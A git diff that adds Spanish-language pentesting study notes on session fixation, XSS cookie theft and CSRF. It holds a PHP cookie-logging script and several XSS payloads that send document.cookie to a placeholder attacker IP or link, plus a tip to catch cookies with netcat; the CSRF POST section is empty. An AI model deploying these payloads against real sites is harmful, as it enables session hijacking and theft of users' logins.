@@ -6,3 +6,47 @@ A menudo nos encontramos aplicaciones que nos brindan unsa sesion pre-logueo. En
 de loguearnos.
 Esto quiere decir que si esta cookie o token viaja en la url, un atacante puede crear una url con un token creado por el ciberdelincuente, pasarle dicho link a la victima,
 una vez logueada la victima, el atacante puede hacer un hijacking con el token creado por el mismo.
+
+
+########## Robando cookies con XSS:
+
+levantamos un servidor php y alojamos un archivo con el siguiente código:
+
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+
+luego insertamos el payload en el formulario suceptible a XSS. Ejemplo de payload:
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
+
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+
+podemos también poner a escuchar un netcat y recibir el valor de la cookie en el mismo sin el servidor php.
+
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+
+
+################################CSRF
+
+Podríamos aprovechar esta vulnerabilidad en el caso de que una app no cuente con un token csrf en un formulario. Esto
+nos permitiría hacer una request desde otro sitio.
+De esta manera podríamos crear un sitio web malicioso y generar request a un sitio web legal si es que hay un usuario con
+una session en el navegador de la víctima.
+
+##################### CSRF GET
+
+Si un formulario tiene el csrf y es enviado por el método get, podemos hacernos con el mismo de formas sencillas como mirando
+el historial de un usuario. de esta forma podemos generar una request que impacte en el sitio.
+
+################### CSRF POST
+
+
+
